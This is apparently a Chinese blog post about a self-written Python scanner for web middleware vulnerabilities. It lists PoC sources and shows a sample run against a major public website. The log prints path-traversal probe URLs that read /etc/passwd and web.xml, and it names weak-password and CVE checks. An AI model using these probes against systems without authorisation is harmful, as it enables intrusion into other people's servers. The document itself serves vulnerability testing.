1.  
最近在看web中间件的漏洞  
看到一个三年前的脚本：https://github.com/ywolf/F-MiddlewareScan  
想着自己写一个中间件相关的，正是脚本好写，poc和exp难  
github链接：https://github.com/nihaohello/N-MiddlewareScan  
  
  
  
2.  
#plugins vuln poc exp  
主要是下面模块：  
1.axis  
xss  弱密码  
2.glashfish  
3.jboss  
4.resin  
5.weblogic  
6.tomcat  
7.struts2  
8.IIS  
9.fastcgi  
10.phpcgi  
11.apache  
12.nginx  
13.spring mvc  
  
  
借用和拉用了（有些也许没有写到）：  
axis，glassfish，nginx，iis：  
https://github.com/rabbitmask/WeblogicR  
  
  
jboss:  
https://github.com/search?l=Python&q=jboss&type=Repositories  
https://github.com/SkewwG/VulScan/blob/master/Jboss/CVE-2017-12149.py  
  
weblogic:  
https://github.com/search?l=Python&q=weblogic&type=Repositories  
https://www.exploit-db.com/  :有poc  
https://nvd.nist.gov/vuln/detail/CVE-2017-10271  
https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html  
https://github.com/rabbitmask/WeblogicR    poc来自这  
https://github.com/kingkaki/weblogic-scan  
  
  
tomcat:  
https://github.com/search?l=Python&q=tomcat&type=Repositories  
https://github.com/SkewwG/VulScan  
  
  
struts2:  
https://github.com/search?l=Python&q=struts2&type=Repositories  
  
  
spring：  
http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=spring  
https://www.exploit-db.com/  18年  
  
  
  
  
  
  
3.  
测试例子：  
python N-MiddlewareScan.py -u https://www.baidu.com  
  
第一部分standard_poc 测试开始:  
***********************  
https://www.baidu.com  CVE_2018_10661 测试结束  
https://www.baidu.com/axis2/axis2-web/HappyAxis.jsp信息扫描完成  
https://www.baidu.com/axis2/axis2-admin/login弱口令扫描完成  
https://www.baidu.com/j_security_check?loginButton=Login 测试结束  
https://www.baidu.com  exist Directory_traversal vuln 测试结束  
https://www.baidu.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo 扫描完成  
https://www.baidu.com/web-console/Invoker 扫描完成  
https://www.baidu.com/invoker/JMXInvokerServlet 扫描完成  
https://www.baidu.com/admin-console/ 扫描完成  
https://www.baidu.com/resin-admin/j_security_check?j_uri=index.php扫描完成  
https://www.baidu.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd扫描完成  
https://www.baidu.com/resin-doc/viewfile/?contextpath=/otherwebapp&servletpath=&file=WEB-INF/web.xml扫描完成  
https://www.baidu.com/%20..\web-inf扫描完成  
https://www.baidu.com/%3f.jsp扫描完成  
https://www.baidu.com/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd扫描完成  
  
  
  
第一部分 standard_poc 没有测试出任何的漏洞。  
  
  
  
第二部分：  
开始测试特定的poc脚本：  
***********************  
对tomcat weak password 进行检测  
CVE_2015_4852 脚本出错  
CVE_2016_0638 脚本出错  
CVE_2016_3510 脚本出错  
CVE_2017_3248 脚本出错  
[-]目标weblogic未检测到CVE-2017-3506  
CVE_2018_2893 脚本出错  
CVE_2018_2628 脚本出错  
managerURL200 脚本出错  
uddi_ssrf 脚本出错  
CVE_2017_12149 检测函数出错  
https://www.baidu.com  
[36mCode by Lucifer.[0m  
[36m-------检测struts2漏洞--------  
目标url:https://www.baidu.com[0m  
[32m目标不存在struts2-005漏洞..[0m  
[32m目标不存在struts2-009漏洞..[0m  
[32m目标不存在struts2-013漏洞..[0m  
[36m检测struts2-016超时..[0m  
超时原因:  HTTPSConnectionPool(host='www.baidu.com', port=443): Read timed out. (read timeout=6)  
[32m目标不存在struts2-019漏洞..[0m  
[36m检测struts2-devmode超时..[0m  
超时原因:  HTTPSConnectionPool(host='www.baidu.com', port=443): Read timed out. (read timeout=6)  
[32m目标不存在struts2-032漏洞..[0m  
[32m目标不存在struts2-033漏洞..[0m  
[32m目标不存在struts2-037漏洞..[0m  
[32m目标不存在struts2-045漏洞..[0m  
[32m目标不存在struts2-046漏洞..[0m  
[32m目标不存在struts2-048漏洞..[0m  
[32m目标不存在struts2-020漏洞..[0m  
[32m目标不存在struts2-052漏洞..[0m  
[32m目标不存在struts2-053漏洞..[0m  
[32m目标不存在struts2-057漏洞..(只提供检测)[0m  
[-]不存在SpringCVE-2017-8046漏洞!  
[-] https://www.baidu.com 不存在IIS PUT上传  
Server 不存在 IIS shortname vulnerable  
Server 不存在 IIS shortname vulnerable  
[-]不存在Nginx越界读取缓存漏洞（CVE-2017-7529）漏洞...(低危)  
  
  
相关漏洞检测完成。  
